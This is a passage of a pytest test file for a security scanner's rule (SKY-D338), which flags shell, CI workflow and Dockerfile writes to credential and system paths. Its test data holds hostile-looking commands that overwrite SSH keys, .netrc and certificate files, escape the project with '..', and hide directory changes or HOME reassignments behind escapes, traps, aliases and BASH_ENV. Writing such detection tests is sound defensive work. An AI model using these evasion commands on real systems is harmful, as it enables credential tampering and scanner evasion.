    # Dockerfile WORKDIR, a cd on an earlier line of a shell file, or a
    # subprocess cwd are invisible here, so nothing vouches for the project.
    assert "SKY-D338" in _rule_ids_for(command)
    assert "SKY-D338" not in _rule_ids_for(command, in_project=True)


@pytest.mark.parametrize(
    "command",
    [
        # "/home/.." is not a user's home directory.
        "cat x > /home/../etc/ssl/cert.pem",
        "cat x > /home/./../etc/ssl/cert.pem",
        "cat x > /home/../root/.netrc",
        "cat x > /home/./.netrc",
        # A .env with ".." may leave the project.
        "cat template > ../.env",
        "cat x > ../../.env",
        "cat x > ../../../home/bob/project/.env",
        "cat x > config/../../.env",
        # Look-alikes of the home allowlist.
        "cat x > ~/.ssh/known_hosts\\ ",
        "cat x > ~+/.netrc",
        "cat x > ~root/.netrc",
        "cat x > C:/Users/runneradmin/.ssh/known_hosts",
        "cat x > C:\\\\Users\\\\runneradmin\\\\.ssh\\\\known_hosts",
    ],
)
def test_dot_dot_and_lookalike_targets_are_not_routine(command):
    assert "SKY-D338" in _rule_ids_for(command, in_project=True, home=True)


# With HOME reassigned, "~" may be any directory.
@pytest.mark.parametrize(
    "command",
    [
        "export HOME=/etc/ssl; cat x > ~/.netrc",
        "HOME=/etc/ssl cat x > ~/.netrc",
        "HOME=/etc; cat key > ~/.ssh/id_rsa",
        'export HOME=/etc\necho "$K" | base64 -d >> ~/.ssh/known_hosts',
        "for HOME in /etc; do cat x > ~/.pypirc; done",
        "read -r HOME < dir.txt; cat x > ~/.netrc",
        ': "${HOME:=/etc}"; cat x > ~/.netrc',
        "declare -x HOME=/etc; cat x > $HOME/.netrc",
        "$env:HOME = 'C:/x'; cat x > ~/.netrc",
    ],
)
def test_home_credential_writes_after_home_is_reassigned_are_reported(command):
    assert "SKY-D338" in _rule_ids_for(command, in_project=True, home=True)


@pytest.mark.parametrize(
    "command",
    [
        "cat x > ~/.netrc",
        "cat known >> ~/.ssh/known_hosts",
        "cat key > ~/.ssh/id_rsa",
        "cat x > $HOME/.pypirc",
        "cat key > /root/.ssh/id_rsa",
    ],
)
def test_home_credential_writes_need_a_caller_that_vouches_for_home(command):
    # Shell files, GitLab jobs and Dockerfiles can set HOME in another
    # statement (export HOME on an earlier line, variables:, ENV HOME), so
    # only a caller that checked says HOME is the default one.
    assert "SKY-D338" in _rule_ids_for(command)
    assert "SKY-D338" not in _rule_ids_for(command, home=True)


def test_long_glob_targets_count_as_matching_without_analysis():
    from skylos.security.command_guard_paths import glob_could_match

    pattern = "/tmp/" + "a?" * 150
    assert glob_could_match(pattern, "authorized_keys")
    assert "SKY-D339" in _rule_ids_for("cat x > " + pattern)
    assert glob_could_match.cache_info().maxsize


def _workflow_rule_ids(
    tmp_path,
    steps: str,
    *,
    defaults: str = "",
    runs_on: str = "ubuntu-latest",
    job: str = "",
) -> set[str]:
    from skylos.rules.config.cicd.github_actions import scan_github_actions_file

    workflow = tmp_path / ".github" / "workflows" / "ci.yml"
    workflow.parent.mkdir(parents=True, exist_ok=True)
    workflow.write_text(  # skylos: ignore[SKY-D324] pytest tmp_path with a fixed filename
        "name: ci\non: push\n"
        + defaults
        + f"jobs:\n  build:\n    runs-on: {runs_on}\n"
        + job
        + "    steps:\n"
        + steps,
        encoding="utf-8",
    )
    return _rule_ids(scan_github_actions_file(workflow))


PONTOON_RUN = (
    "        run: |\n"
    "          sed -e 's#^DATABASE_URL=.*#DATABASE_URL=postgres://localhost/db#' "
    "docker/config/server.env.template > .env\n"
)
PONTOON_STEP = "      - name: env\n" + PONTOON_RUN
ENV_RUN = "        run: sed s/a/b/ env.template > .env\n"
NETRC_STEP = "      - run: cat netrc.txt > ~/.netrc\n"


def _job_defaults(key: str, value: str) -> str:
    return f"    defaults:\n      run:\n        {key}: {value}\n"


def _workflow_defaults(key: str, value: str) -> str:
    return f"defaults:\n  run:\n    {key}: {value}\n"


@pytest.mark.parametrize(
    "steps,options",
    [
        (PONTOON_STEP, {}),
        ("      - working-directory: frontend\n" + ENV_RUN, {}),
        ("      - working-directory: ./app\n" + ENV_RUN, {}),
        ("      - working-directory: ${{ github.workspace }}/app\n" + ENV_RUN, {}),
        ("      - working-directory: ${{ GITHUB.WORKSPACE }}/app\n" + ENV_RUN, {}),
        (PONTOON_STEP, {"defaults": _workflow_defaults("working-directory", "api")}),
        ("      - shell: bash\n" + ENV_RUN, {}),
        ("      - shell: sh\n" + ENV_RUN, {}),
        (PONTOON_STEP, {"runs_on": "macos-14"}),
        (PONTOON_STEP, {"runs_on": "[self-hosted, linux, x64]"}),
        (NETRC_STEP, {}),
    ],
)
def test_github_actions_routine_writes_in_the_workspace_are_not_reported(
    tmp_path, steps, options
):
    assert "SKY-D338" not in _workflow_rule_ids(tmp_path, steps, **options)


@pytest.mark.parametrize(
    "steps,options",
    [
        # A working directory outside the workspace, or one not known.
        ("      - working-directory: /etc\n" + PONTOON_RUN, {}),
        ("      - working-directory: ../shared\n" + ENV_RUN, {}),
        ("      - working-directory: ~/x\n" + ENV_RUN, {}),
        ("      - working-directory: ${{ env.DIR }}\n" + ENV_RUN, {}),
        ("      - working-directory: ${{ matrix.dir }}\n" + ENV_RUN, {}),
        ("      - working-directory: $HOME/x\n" + ENV_RUN, {}),
        ("      - working-directory: ${{ GITHUB.WORKSPACE }}/..\n" + ENV_RUN, {}),
        ("      - working-directory: ${{ github.workspace }}/../..\n" + ENV_RUN, {}),
        (PONTOON_STEP, {"defaults": _workflow_defaults("working-directory", "/etc")}),
        (PONTOON_STEP, {"job": _job_defaults("working-directory", "/etc")}),
        (
            PONTOON_STEP,
            {
                "defaults": "x-dir: &d ../..\n",
                "job": _job_defaults("working-directory", "*d"),
            },
        ),
        (
            "      - run: |\n          echo start\n          cd /tmp\n"
            '          echo "$X" | base64 -d > .env\n',
            {},
        ),
        ('      - run: eval "cd $HOME"; cat x > .env\n', {}),
        ("      - run: C=cd; $C /tmp; cat x > .env\n", {}),
        # A shell other than bash or sh.
        ("      - shell: pwsh\n        run: Set-Location ..; cat s.txt > .env\n", {}),
        ("      - shell: pwsh\n" + ENV_RUN, {}),
        ("      - shell: bash -e {0}\n" + ENV_RUN, {}),
        ("      - shell: env -C /tmp bash -e {0}\n" + ENV_RUN, {}),
        ("      - shell: python\n" + ENV_RUN, {}),
        (PONTOON_STEP, {"job": _job_defaults("shell", "pwsh")}),
        (PONTOON_STEP, {"defaults": _workflow_defaults("shell", "pwsh")}),
        # A runner that is not clearly Linux or macOS.
        (PONTOON_STEP, {"runs_on": "windows-latest"}),
        (PONTOON_STEP, {"runs_on": "${{ matrix.os }}"}),
        (PONTOON_STEP, {"runs_on": "[self-hosted]"}),
        (PONTOON_STEP, {"runs_on": "[self-hosted, Windows, x64]"}),
        (PONTOON_STEP, {"runs_on": "{group: big-runners}"}),
        # HOME set in env: "~" may be any directory.
        (
            "      - env:\n          HOME: /etc/ssl\n"
            "        run: cat netrc.txt > ~/.netrc\n",
            {},
        ),
        (NETRC_STEP, {"job": "    env:\n      HOME: /etc\n"}),
        (NETRC_STEP, {"defaults": "env:\n  HOME: /etc\n"}),
        (NETRC_STEP, {"defaults": "env: ${{ fromJSON(vars.ENV) }}\n"}),
    ],
)
def test_github_actions_relative_or_home_writes_are_reported_when_unsure(
    tmp_path, steps, options
):
    assert "SKY-D338" in _workflow_rule_ids(tmp_path, steps, **options)


def test_composite_action_relative_writes_are_reported(tmp_path):
    from skylos.rules.config.cicd.github_actions import scan_github_actions_file

    action = tmp_path / "action.yml"
    action.write_text(
        "name: x\nruns:\n  using: composite\n  steps:\n"
        "    - shell: bash\n      run: cat y > .env\n",
        encoding="utf-8",
    )
    # The caller's runner and working directory are unknown.
    assert "SKY-D338" in _rule_ids(scan_github_actions_file(action, root=tmp_path))


# "$HOME" is case-sensitive: "$home" and "${Home}" are other variables.
@pytest.mark.parametrize(
    "command",
    [
        "cat creds > $home/.ssh/known_hosts",
        "cat x > $home/.netrc",
        "cat x > $Home/.netrc",
        "cat key > ${home}/.ssh/id_rsa",
        "cat x > ${hOME}/.pypirc",
        "home=/var/lib/jenkins; cat creds > $home/.ssh/known_hosts",
        "cat x > /ROOT/.netrc",
    ],
)
def test_home_variable_lookalikes_are_not_the_home_directory(command):
    assert "SKY-D338" in _rule_ids_for(command, in_project=True, home=True)


# Escapes, quotes, functions, traps, case arms and aliases can hide a
# directory change or a HOME assignment from a plain word search.
@pytest.mark.parametrize(
    "command",
    [
        "c\\d /tmp; cat x > .env",
        "cat x > .env\nc\\d /tmp",
        "x=1 c\\d /tmp; cat x > .env",
        "[[ 1 ]] && c\\d /tmp; cat x > .env",
        "for d in /tmp; do c\\d $d; done; cat x > .env",
        "command -p c\\d /tmp; cat x > .env",
        "time -p c\\d /tmp; cat x > .env",
        "c\\\nd /tmp; cat x > .env",
        'c"d" /tmp; cat x > .env',
        "case x in x) c\\d /tmp ;; esac; cat x > .env",
        "case $1 in a) true ;; esac; cat x > .env",
        "f() { c\\d /tmp; }; f; cat x > .env",
        "go () { true; }; go; cat x > .env",
        "function f { c\\d /tmp; }; f; cat x > .env",
        "trap 'c\\d /tmp' DEBUG; cat x > .env",
        "trap true DEBUG; cat x > .env",
        "alias go='c\\d /tmp'; go; cat x > .env",
        "{c,}d /tmp; cat x > .env",
        "c? /tmp; cat x > .env",
    ],
)
def test_hidden_directory_changes_deny_the_env_exemption(command):
    assert "SKY-D338" in _rule_ids_for(command, in_project=True)


@pytest.mark.parametrize(
    "command",
    [
        "export HO\\ME=/var/lib/jenkins; cat creds > ~/.ssh/known_hosts",
        "HO''ME=/tmp; cat x > ~/.netrc",
        'export "HOME"=/tmp; cat x > ~/.netrc',
        "export HO\\\nME=/tmp; cat x > ~/.netrc",
    ],
)
def test_hidden_home_assignments_deny_the_home_allowance(command):
    assert "SKY-D338" in _rule_ids_for(command, in_project=True, home=True)


def test_shell_file_home_reassigned_on_an_earlier_line_is_reported(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        "#!/bin/sh\nexport HOME=/var/lib/jenkins\ncat creds > ~/.ssh/known_hosts\n",
    )
    assert "SKY-D338" in _rule_ids(findings)


def test_gitlab_home_reassigned_in_an_earlier_item_is_reported(tmp_path):
    from skylos.rules.config.cicd.gitlab_ci import scan_gitlab_ci_file

    ci = tmp_path / ".gitlab-ci.yml"
    ci.write_text(
        "build:\n  script:\n    - export HOME=/var/lib/jenkins\n"
        "    - cat creds > ~/.ssh/known_hosts\n",
        encoding="utf-8",
    )
    assert "SKY-D338" in _rule_ids(scan_gitlab_ci_file(ci, root=tmp_path))


def test_dockerfile_env_home_then_run_is_reported(tmp_path):
    from skylos.rules.config.container.dockerfile import scan_dockerfile_file

    dockerfile = tmp_path / "Dockerfile"
    dockerfile.write_text(
        "FROM alpine:3.20\nENV HOME=/var/lib/jenkins\n"
        "RUN cat creds > ~/.ssh/known_hosts\n",
        encoding="utf-8",
    )
    assert "SKY-D338" in _rule_ids(scan_dockerfile_file(dockerfile, root=tmp_path))


KNOWN_HOSTS_STEP = "      - run: cat creds > ~/.ssh/known_hosts\n"
CONFIG_ENV_STEP = "      - run: cat config.tmpl > .env\n"


@pytest.mark.parametrize(
    "steps,options",
    [
        (KNOWN_HOSTS_STEP, {}),
        (CONFIG_ENV_STEP, {}),
        ('      - run: echo "X=1" >> "$GITHUB_ENV"\n' + CONFIG_ENV_STEP, {}),
        ('      - run: echo "X=1" >> "$GITHUB_ENV"\n' + KNOWN_HOSTS_STEP, {}),
    ],
)
def test_github_actions_plain_routine_steps_stay_unreported(tmp_path, steps, options):
    assert "SKY-D338" not in _workflow_rule_ids(tmp_path, steps, **options)


@pytest.mark.parametrize(
    "steps,options",
    [
        # Another step or env redefines HOME for the whole job.
        (
            '      - run: echo "HOME=/var/lib/jenkins" >> "$GITHUB_ENV"\n'
            + KNOWN_HOSTS_STEP,
            {},
        ),
        (
            "      - run: echo HO\\ME=/x >> $GITHUB_ENV\n" + KNOWN_HOSTS_STEP,
            {},
        ),
        (KNOWN_HOSTS_STEP + "      - run: export HOME=/x\n", {}),
        (
            "      - run: cat creds > ~/.netrc\n        env:\n          HOME: /x\n",
            {},
        ),
        (
            KNOWN_HOSTS_STEP,
            {
                "job": "    container:\n      image: alpine\n      env:\n        HOME: /x\n"
            },
        ),
        ("      - run: home=/x; cat creds > $home/.ssh/known_hosts\n", {}),
        ("      - run: export HO\\ME=/x; cat creds > ~/.ssh/known_hosts\n", {}),
        # BASH_ENV (or ENV) runs a file before every later bash step.
        (
            "      - run: echo 'cd /tmp' > \"$RUNNER_TEMP/x.sh\"; "
            'echo "BASH_ENV=$RUNNER_TEMP/x.sh" >> "$GITHUB_ENV"\n' + CONFIG_ENV_STEP,
            {},
        ),
        (CONFIG_ENV_STEP, {"defaults": "env:\n  BASH_ENV: ./x.sh\n"}),
        (CONFIG_ENV_STEP, {"job": "    env:\n      ENV: ./x.sh\n"}),
        (
            "      - run: cat config.tmpl > .env\n        env:\n          BASH_ENV: x\n",
            {},
        ),
        # Hidden directory changes inside the step.
        ('      - run: case x in x) c\\d "$RUNNER_TEMP" ;; esac; cat c > .env\n', {}),
        ("      - run: trap 'c\\d ../..' DEBUG; cat config.tmpl > .env\n", {}),
        ('      - run: go() { c\\d "$RUNNER_TEMP"; }; go; cat c > .env\n', {}),
    ],
)
def test_github_actions_home_and_env_writes_are_reported_when_unsure(
    tmp_path, steps, options
):
    assert "SKY-D338" in _workflow_rule_ids(tmp_path, steps, **options)


def test_composite_action_home_writes_are_reported(tmp_path):
    from skylos.rules.config.cicd.github_actions import scan_github_actions_file

    action = tmp_path / "action.yml"
    action.write_text(
        "name: x\nruns:\n  using: composite\n  steps:\n"
        "    - shell: bash\n      run: cat creds > ~/.ssh/known_hosts\n",
        encoding="utf-8",
    )
    # The calling job's env and earlier steps are unknown.
    assert "SKY-D338" in _rule_ids(scan_github_actions_file(action, root=tmp_path))
